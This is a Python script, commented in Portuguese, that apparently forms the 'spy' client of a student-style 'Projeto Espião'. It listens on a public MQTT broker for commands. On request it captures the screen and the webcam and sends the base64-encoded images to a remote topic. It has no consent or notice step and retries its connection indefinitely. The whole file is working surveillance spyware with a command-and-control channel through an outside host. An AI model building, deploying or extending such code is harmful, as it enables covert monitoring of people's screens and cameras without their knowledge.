"""
Projeto Espião - Módulo do Funcionário (Espião)
---------------------------------------
Este script representa o "Funcionário" que atua como espião. Ele se conecta a um broker MQTT, aguarda comandos do Gerente para capturar a tela e a webcam, e
envia os dados de volta ao Gerente via MQTT. O script é projetado para ser simples e eficiente, utilizando bibliotecas populares para captura de tela e webcam, além de comunicação MQTT.
-----------------------
Dependências:
- paho-mqtt: Para comunicação MQTT.
- Pillow: Para captura de tela.
- OpenCV: Para captura de webcam.
-----------------------
Nota: Código desenvolvido com auxílio de IA, adaptado para o contexto do projeto.
"""

import json
import base64
import cv2
from PIL import ImageGrab
import io
import time
import paho.mqtt.client as mqtt

# --- CONFIGURAÇÕES ---
ID_FUNCIONARIO = "Funcionario_01"
BROKER = "broker.hivemq.com"
PORTA = 1883
TOPICO_COMANDOS = "projeto_espiao/comandos"    
TOPICO_DADOS = "projeto_espiao/dados_retorno" 

# --- FUNÇÕES DE CAPTURA  ---

def capturar_tela():
    """Tira um print da tela principal e retorna em Base64."""
    try:
        imagem = ImageGrab.grab()
        buffer = io.BytesIO()
        imagem.save(buffer, format='JPEG', quality=70) # Quality reduz o peso da msg MQTT
        return base64.b64encode(buffer.getvalue()).decode('utf-8')
    except Exception as e:
        print(f"Erro ao capturar tela: {e}")
        return None

def capturar_webcam():
    """Tira uma foto da webcam padrão e retorna em Base64."""
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            # Redimensionar para diminuir o tamanho da mensagem se necessário
            frame = cv2.resize(frame, (640, 480))
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
            return base64.b64encode(buffer).decode('utf-8')
    except Exception as e:
        print(f"Erro ao capturar webcam: {e}")
    return None

# --- LÓGICA DE COMUNICAÇÃO ---

def ao_receber_comando(client, userdata, msg):
    """Callback executada quando o Gerente envia uma mensagem."""
    try:
        dados_recebidos = json.loads(msg.payload.decode())
        
        if dados_recebidos.get("comando") == "CAPTURAR":
            print("[!] Comando de captura recebido. Processando...")
            
            tela_b64 = capturar_tela()
            webcam_b64 = capturar_webcam()
            
            resposta = {
                "tipo": "imagens",
                "id_cliente": ID_FUNCIONARIO,
                "screenshot": tela_b64,
                "webcam": webcam_b64
            }
            
            # Publica o resultado no tópico de dados
            client.publish(TOPICO_DADOS, json.dumps(resposta))
            print("[OK] Dados enviados ao Gerente.")
            
    except Exception as e:
        print(f"[ERRO] Falha ao processar comando: {e}")

def iniciar_espiao():
    client = mqtt.Client()
    client.on_message = ao_receber_comando
    
    print(f"Conectando ao Broker {BROKER}...")
    try:
        client.connect(BROKER, PORTA, 60)
        client.subscribe(TOPICO_COMANDOS)
        
        print(f"Espião Online ({ID_FUNCIONARIO}). Aguardando ordens...")
        client.loop_forever()
    except Exception as e:
        print(f"Falha na conexão: {e}. Tentando novamente em 10s...")
        time.sleep(10)
        iniciar_espiao()

if __name__ == "__main__":
    iniciar_espiao()